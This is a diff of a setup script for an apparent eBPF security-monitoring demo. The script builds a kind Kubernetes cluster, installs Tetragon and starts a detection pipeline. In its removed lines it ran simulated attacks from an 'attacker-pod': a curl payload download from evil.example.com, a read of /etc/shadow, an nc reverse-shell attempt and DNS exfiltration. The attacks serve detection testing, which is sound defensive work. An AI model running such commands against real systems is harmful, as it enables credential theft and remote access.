@@ -14,7 +14,7 @@ echo "============================================================"
 mkdir -p bin
 export PATH="$PWD/bin:$PATH"
 
-echo "[1/6] Checking tooling dependencies..."
+echo "[1/4] Checking tooling dependencies..."
 if ! command -v kind &>/dev/null; then
     echo "  ↳ Downloading kind..."
     curl -sLo ./bin/kind https://kind.sigs.k8s.io/dl/v0.22.0/kind-linux-amd64
@@ -40,7 +40,7 @@ CLUSTER_NAME="sentinel-cluster"
 
 # ── 2. Kubernetes Cluster ────────────────────────────────────────
 echo ""
-echo "[2/6] Provisioning Kubernetes cluster..."
+echo "[2/4] Provisioning Kubernetes cluster..."
 if kind get clusters 2>/dev/null | grep -q "^${CLUSTER_NAME}$"; then
     echo "  ✓ Cluster '${CLUSTER_NAME}' already exists"
 else
@@ -71,7 +71,7 @@ docker exec ${CLUSTER_NAME}-control-plane \
 
 # ── 3. Tetragon eBPF Agent ───────────────────────────────────────
 echo ""
-echo "[3/6] Deploying Tetragon eBPF agent..."
+echo "[3/4] Deploying Tetragon eBPF agent..."
 if helm list -n kube-system 2>/dev/null | grep -q tetragon; then
     echo "  ✓ Tetragon already installed"
 else
@@ -91,36 +91,9 @@ kubectl apply -f sentinel-policy.yaml
 
 echo "  ✓ Tetragon is LIVE and monitoring"
 
-# ── 4. Deploy Real Attack Pod ────────────────────────────────────
+# ── 4. Stream + Analyze ──────────────────────────────────────────
 echo ""
-echo "[4/6] Deploying attacker workload into cluster..."
-kubectl delete pod attacker-pod --ignore-not-found=true >/dev/null 2>&1
-kubectl run attacker-pod \
-    --image=alpine:latest \
-    --restart=Never \
-    -- sleep 3600
-echo "  ↳ Waiting for attacker pod..."
-kubectl wait --for=condition=ready pod attacker-pod --timeout=60s
-echo "  ✓ Attacker pod is LIVE in namespace: default"
-
-# ── 5. Execute Real Attacks ──────────────────────────────────────
-echo ""
-echo "[5/6] Executing REAL attack commands inside the cluster..."
-echo "  ↳ Attack 1: Downloading external payload via curl"
-kubectl exec attacker-pod -- curl -sk http://evil.example.com/payload.sh -o /dev/null 2>/dev/null || true
-echo "  ↳ Attack 2: Reading /etc/shadow (privilege escalation recon)"
-kubectl exec attacker-pod -- cat /etc/shadow 2>/dev/null || true
-echo "  ↳ Attack 3: Attempting reverse shell via nc"
-kubectl exec attacker-pod -- sh -c "nc -w1 10.0.0.99 4444 </dev/null" 2>/dev/null &
-echo "  ↳ Attack 4: Process enumeration"
-kubectl exec attacker-pod -- ps aux 2>/dev/null || true
-echo "  ↳ Attack 5: DNS exfiltration attempt"
-kubectl exec attacker-pod -- nslookup evil.example.com 2>/dev/null || true
-echo "  ✓ All attack commands executed in real cluster"
-
-# ── 6. Stream + Analyze ──────────────────────────────────────────
-echo ""
-echo "[6/6] Starting Sentinel-Core ML + RAG Pipeline..."
+echo "[4/4] Starting Sentinel-Core ML + RAG Pipeline..."
 export PYTHONPATH="$PWD:$PYTHONPATH"
 
 cat << 'PYEOF' > _sentinel_live.py
@@ -238,10 +211,6 @@ echo "📊 Dashboard API: http://127.0.0.1:8080"
 PYTHONPATH="$PWD" python3 -m uvicorn remediation.server:app --host 0.0.0.0 --port 8002 > remediation_api.log 2>&1 &
 REMEDIATION_PID=$!
 echo "🛡️ Remediation API: http://127.0.0.1:8002/api/remediation"
-
-PYTHONPATH="$PWD" python3 -m uvicorn attacker-dashboard.app:app --host 0.0.0.0 --port 8003 > attacker_api.log 2>&1 &
-ATTACKER_PID=$!
-echo "⚔️ Attacker Control: http://127.0.0.1:8003"
 
 echo "============================================================"
 echo "  STREAM ACTIVE — Real eBPF events flowing"
